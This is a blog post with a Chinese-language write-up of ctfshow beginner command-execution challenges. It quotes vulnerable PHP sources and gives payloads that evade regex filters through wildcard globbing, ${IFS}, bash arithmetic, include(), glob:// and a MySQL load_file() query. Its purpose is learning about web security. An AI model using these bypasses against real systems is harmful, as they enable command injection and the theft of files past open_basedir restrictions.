<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctfshow web入门 命令执行"><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>ctfshow web入门 命令执行 | cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-55"><span class="toc-number">1.</span> <span class="toc-text">web 55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-54"><span class="toc-number">2.</span> <span class="toc-text">web 54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-57"><span class="toc-number">3.</span> <span class="toc-text">web 57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-58-65"><span class="toc-number">4.</span> <span class="toc-text">web 58~65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-66"><span class="toc-number">5.</span> <span class="toc-text">web 66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-67"><span class="toc-number">6.</span> <span class="toc-text">web 67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-68"><span class="toc-number">7.</span> <span class="toc-text">web 68</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-69-70"><span class="toc-number">8.</span> <span class="toc-text">web 69~70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-70"><span class="toc-number">9.</span> <span class="toc-text">web 70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-73%E3%80%8174"><span class="toc-number">10.</span> <span class="toc-text">web 73、74</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-75-76"><span class="toc-number">11.</span> <span class="toc-text">web 75~76</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-77"><span class="toc-number">12.</span> <span class="toc-text">web 77</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB118"><span class="toc-number">13.</span> <span class="toc-text">WEB118</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119-120"><span class="toc-number">14.</span> <span class="toc-text">web119~120</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">39</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">ctfshow web入门 命令执行</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>题目为上；<br> 1、用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        breakimport requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>2、使用/bin这个目录：<br>       bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>       这题利用/bin/base64<br>base64这个命令就是将指定的文件的内容以base64加密的形式输出。<br>因为过滤了字母，正好可以用64来匹配，最终payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>

<h2 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>题目如上；<br>同55一样运用/bin目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于/bin上拥有cat，因此用/bin/cat flag.php;便可查找flag。</span><br></pre></td></tr></table></figure>

<p>由于cat flag . php 被过滤则<br>使用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>

<h2 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h2><p>disable_functions函数启动后会禁止一些函数使得一些命令无法使用。<br>又是新姿势，知识点是$(( ))与整数运算。想办法构造出36.<br>双小括号的作用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。</span><br><span class="line">通俗地讲，就是将数学运算表达式放在((和))之间。</span><br><span class="line"></span><br><span class="line">表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</span><br><span class="line"></span><br><span class="line">可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</span><br><span class="line"></span><br><span class="line">可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</span><br></pre></td></tr></table></figure>
<p>大佬曾说：关于取反，根据我学习下来得到的经验就是如果b=<del>a，那么a+b=-1<br>注意：$(())的值是0。$((</del>$(())))的值是-1。$((     $((<del>$(())))       $((</del>$(())))        ))  是-2;<br>则我们可以看出来<br>-2的构成是由两个-1相加得来的且内部也是默认相加；（因此36则需要-37来取反 //说实话没看懂；）<br>因此则需要三十七个$((<del>$(()))) ，之后在取反，取反看大佬说是$((</del>$(( ))))。<br>因此：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span><br></pre></td></tr></table></figure>

<h2 id="web-58-65"><a href="#web-58-65" class="headerlink" title="web 58~65"></a>web 58~65</h2><p>  读文件的函数有这些：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
<p>fgets()函数使用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  c=</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=fgets(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后蚁剑连接。（我也不知道是什么情况😂）</p>
<h2 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h2><p>（该题的flag在根目录下，html下的flag.php是假的）我们看到假的后可以用下面方法打开。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本题的print_r（）被禁</span><br><span class="line">可以用var_dump()来绕过。</span><br></pre></td></tr></table></figure>

<h2 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()被过滤，但是<span class="keyword">include</span>却没有被ban因此可以用文件包含。</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69~70"></a>web 69~70</h2><p>如果var_dump被ban就使用var_export()来绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-70"><a href="#web-70" class="headerlink" title="web 70"></a>web 70</h2><p>题目源码（在附件中）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();<span class="comment">////得到缓冲区的数据</span></span><br><span class="line">        ob_end_clean();<span class="comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>（缓冲区：缓冲区又称为缓存，它是内存空间的一部分。<br>也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>   缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>    比如我们从磁盘里取信息，我们先把读出的数据放在缓冲区，<br>计算机再直接从缓冲区中取数据，等缓冲区的数据取完后再去磁盘中读取，<br>这样就可以减少磁盘的读写次数，<br>再加上计算机对缓冲区的操作大大快于对磁盘的操作，故应用缓冲区可大大提高计算机的运行速度。）<br><strong>本题是在我们输入命令后输出时对输出数据先进行缓存，缓存的数据通过preg_replace()将字母和数字都给替换为？，使得我们无法正常查看。</strong><br>使用exit()/die()提前结束，这样就不会将字符替换为问号（在我看来，应该是没有进行下面的得到缓存区数据的代码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>web72 不会</p>
<h2 id="web-73、74"><a href="#web-73、74" class="headerlink" title="web 73、74"></a>web 73、74</h2><p>无源码，可根据71、72来做。<br>其他大佬都说存在open_basedir函数，因此可以利用glob伪协议来筛选目录。<br>glob伪协议：glob:// — 查找匹配的文件路径模式<br>本题代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">   <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后可以查找到flagc.txt文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>即可得到。</p>
<h2 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75~76"></a>web 75~76</h2><p>和上题一样，通过上题脚本可以看到flag实在flag36.txt中，但之后是由include()函数去报错，之后发现是open_basedir影响使得路径受到限制，不懂,看到大佬wp发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);<span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;<span class="comment">//query()执行查询语句，返回结果集对象，从中可以看出该段代码是将flag36.txt内容传到$row中，并输出。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//回显错误信息。</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//PDOException是错误异常。</span></span><br></pre></td></tr></table></figure>
<p>大师傅们说数据库的连接是读配置文件得到的。至于配置文件在哪。。鬼知道。。。<br>不过这种拿SQL语句来读文件绕过open_basedir和disable_function的姿势实在是第一次见，学到了学到了。</p>
<p>PDO<br>PDO()就是PHP data Object 提供了PHP操作多种数据库的统一的接口,使用的主要思路：<br>1、添加<br>      （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行添加 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="comment">//执行添加</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into student(`name`,`sex`,`sex`) values(&#x27;zhangsan&#x27;,&#x27;男&#x27;,&#x27;18&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$object</span>-&gt;exec(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;添加成功&#x27;</span>;</span><br><span class="line">&#125;<span class="comment">//exec主要用于执行没有返回结果集的操作，比如insert、delete、update，返回的是影响的记录条数</span></span><br></pre></td></tr></table></figure>
<p>2、查询<br> 主要思路：<br>                                         （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行查询 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from student&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$object</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$arr</span>=<span class="variable">$result</span>-&gt;fetch())&#123;</span><br><span class="line">    print_r(<span class="variable">$arr</span>);</span><br><span class="line">&#125;<span class="comment">//用循环利用fetch()方法逐个的取出记录，返回的是关联数组和索引数组两种数组，和mysql_fetch_array()的返回结果一致</span></span><br></pre></td></tr></table></figure>
<p>还可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>=<span class="variable">$result</span>-&gt;fetchAll();<span class="comment">//fetchAll()方法可以一次取出结果集中所有的数组，以二维数组的形式返回，但仍然是关联数组和索引数组两种数组</span></span><br><span class="line">print_r(<span class="variable">$student_info</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h2><p>通过该题，我们可以在开始的提示中看到PHP7.4，从而可以想到FFI（虽然我也不知道如何想到的，但我们应该知道FFI为PHP7.4核心拓展。</p>
<blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag。</p>
